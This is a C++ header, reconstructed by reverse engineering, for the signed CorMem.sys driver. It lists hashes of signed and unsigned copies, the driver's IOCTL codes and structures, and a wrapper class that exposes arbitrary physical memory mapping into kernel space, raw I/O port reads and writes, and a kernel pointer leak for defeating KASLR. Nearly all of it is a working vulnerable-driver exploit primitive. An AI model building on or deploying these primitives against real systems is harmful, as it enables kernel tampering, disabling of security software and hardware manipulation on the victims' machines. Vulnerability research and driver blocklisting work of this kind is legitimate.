// cormem.h — Teledyne Sapera LT CorMem.sys user-mode interface
// Reconstructed from static analysis of CorMem.sys 9.00 (x64)
// Signed copy:   SHA256 40C855D20D497823716A08A443DC85846233226985EE653770BC3B245CF2ED0F
// Unsigned copy: SHA256 9977054734C44B080FB26FE8F296CD3CCEBACF2BDB7949617AECB14064A42247
//
// Device:        \\.\CORMEM   (\Device\CORMEM, symlink \DosDevices\CORMEM)
// Access model:  default WDM ACL -> Administrators / SYSTEM only
// All IOCTLs:    FILE_DEVICE_UNKNOWN (0x22), FILE_ANY_ACCESS, METHOD_BUFFERED
#pragma once
#include <windows.h>
#include <cstdint>

#define CORMEM_DEVICE_PATH L"\\\\.\\CORMEM"

#define CORMEM_IOCTL(fn) CTL_CODE(0x22, fn, 0, METHOD_BUFFERED)

enum CORMEM_IOCTL_CODE : DWORD {
    CormemQueryInfo        = CORMEM_IOCTL(0x800),  // 0x222000 -> 0x1400067E8  query, out <= 0x1C
    CormemReleaseObject    = CORMEM_IOCTL(0x801),  // 0x222004 -> free/lookup by id
    CormemGetFunctionTable = CORMEM_IOCTL(0x802),  // 0x222008 -> inline; 88B of kernel code ptrs
    CormemMapPhysical      = CORMEM_IOCTL(0x806),  // 0x22200C -> 0x140006154  ARBITRARY PHYS MAP
    CormemHandlerUnk       = CORMEM_IOCTL(0x808),  // 0x222010 -> 0x140006E40  (unconfirmed)
    CormemReadIoPort       = CORMEM_IOCTL(0x80A),  // 0x222014 -> 0x140006AA4  ARBITRARY 'in'
    CormemWriteIoPort      = CORMEM_IOCTL(0x80C),  // 0x222018 -> 0x140006F7C  ARBITRARY 'out'
    CormemLockUserPages    = CORMEM_IOCTL(0x80E),  // 0x22201C -> 0x1400060A0  MDL lock/map user buf
    CormemMapPhysicalW64   = CORMEM_IOCTL(0x81A),  // 0x222034 -> inline 0x140002FC6  PHYS MAP (WOW64)
    CormemQueryConfig      = CORMEM_IOCTL(0x81E),  // 0x222038
    CormemQueryOp2         = CORMEM_IOCTL(0x820),  // 0x22203C
    CormemQueryOp3         = CORMEM_IOCTL(0x82A),  // 0x222054
    CormemQueryOp4         = CORMEM_IOCTL(0x82C),  // 0x222058
};

#pragma pack(push, 1)

// ---- 0x22200C input (native x64) -------------------------------------------
// 24 bytes consumed, first 16 meaningful. Third qword is read then discarded
// (internally replaced with flag=1). NO validation on either address field.
struct CORMEM_MAP_REQUEST {
    uint64_t PhysicalAddress;   // target physical address to expose
    uint64_t WindowBase;        // view window base -> ZwMapViewOfSection SectionOffset
                                // (set equal to PhysicalAddress for exact single-page maps)
    uint64_t Reserved;          // ignored
};

// ---- 0x22200C output --------------------------------------------------------
// Driver copies back exactly one qword (dword for 32-bit processes):
// kernel VA = view_base + (PhysicalAddress - WindowBase)
struct CORMEM_MAP_RESULT {
    uint64_t KernelVirtualAddress;
};

// ---- 0x222034 input (WOW64 split encoding) ---------------------------------
// Handled inline at 0x140002FC6; requires InputLen >= 0x10, OutputLen >= 0x10.
struct CORMEM_MAP_REQUEST_W64 {
    uint32_t PhysicalAddressLo;
    uint32_t PhysicalAddressHi;
    uint32_t LengthLo;
    uint32_t LengthHi;
};

// ---- 0x222014 input: I/O port READ (0x140006AA4) ---------------------------
// {Width, Port}. Width: 1=byte (in al,dx), 2=word (in ax,dx), 3=dword (in eax,dx).
// 64-bit process: 8-byte struct {u32 Width, u32 Port}; WOW64 path reads a qword
// at +0 and a dword at +4. Result written back to SystemBuffer[0] (dword).
struct CORMEM_IOPORT_READ {
    uint32_t Width;             // 1 | 2 | 3
    uint32_t Port;              // x86 I/O port number (0x0000-0xFFFF)
};
struct CORMEM_IOPORT_READ_RESULT {
    uint32_t Value;
};

// ---- 0x222018 input: I/O port WRITE (0x140006F7C) --------------------------
// {Width, Port, Value}. Requires InputLen >= 0x10.
struct CORMEM_IOPORT_WRITE {
    uint32_t Width;             // 1 | 2 | 3
    uint32_t Port;
    uint32_t Value;
    uint32_t Reserved;
};

// ---- 0x222008 output: kernel pointer table ---------------------------------
struct CORMEM_FUNCTION_TABLE {
    uint32_t Count;              // observed 15
    uint32_t Reserved;
    uint64_t KernelPointers[15]; // driver-image code pointers (KASLR leak)
};
#pragma pack(pop)

class CorMemDriver {
public:
    bool Open() {
        _h = CreateFileW(CORMEM_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                         0, nullptr, OPEN_EXISTING, 0, nullptr);
        return _h != INVALID_HANDLE_VALUE;
    }

    void Close() {
        if (_h != INVALID_HANDLE_VALUE) { CloseHandle(_h); _h = INVALID_HANDLE_VALUE; }
    }

    // Arbitrary physical memory map. Returns kernel VA or 0.
    uint64_t MapPhysical(uint64_t physicalAddress) {
        CORMEM_MAP_REQUEST req{};
        CORMEM_MAP_RESULT out{};
        req.PhysicalAddress = physicalAddress;
        req.WindowBase      = physicalAddress;
        DWORD ret = 0;
        if (!DeviceIoControl(_h, CormemMapPhysical,
                             &req, sizeof(req), &out, sizeof(out), &ret, nullptr))
            return 0;
        return out.KernelVirtualAddress;
    }

    // Arbitrary I/O port read. width: 1|2|3 (bytes|words|dwords).
    bool ReadIoPort(uint16_t port, uint32_t width, uint32_t& value) {
        CORMEM_IOPORT_READ in{ width, port };
        DWORD ret = 0;
        if (!DeviceIoControl(_h, CormemReadIoPort,
                             &in, sizeof(in), &in, sizeof(in), &ret, nullptr))
            return false;
        value = reinterpret_cast<CORMEM_IOPORT_READ_RESULT*>(&in)->Value;
        return true;
    }

    // Arbitrary I/O port write.
    bool WriteIoPort(uint16_t port, uint32_t width, uint32_t value) {
        CORMEM_IOPORT_WRITE in{ width, port, value, 0 };
        DWORD ret = 0;
        return DeviceIoControl(_h, CormemWriteIoPort,
                               &in, sizeof(in), &in, sizeof(in), &ret, nullptr) != FALSE;
    }

    bool GetFunctionTable(CORMEM_FUNCTION_TABLE& out) {
        DWORD ret = 0;
        return DeviceIoControl(_h, CormemGetFunctionTable,
                               nullptr, 0, &out, sizeof(out), &ret, nullptr) != FALSE;
    }

    HANDLE Handle() const { return _h; }

private:
    HANDLE _h = INVALID_HANDLE_VALUE;
};
